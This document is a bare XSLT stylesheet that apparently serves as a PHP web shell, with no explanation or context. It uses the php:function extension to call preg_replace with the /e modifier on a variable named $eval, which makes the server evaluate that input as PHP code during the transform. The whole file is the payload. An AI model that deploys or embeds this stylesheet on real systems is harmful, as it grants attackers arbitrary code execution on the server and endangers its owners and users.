<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
                
                 <xsl:for-each select="eval">
                 <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
</xsl:for-each>
</html>
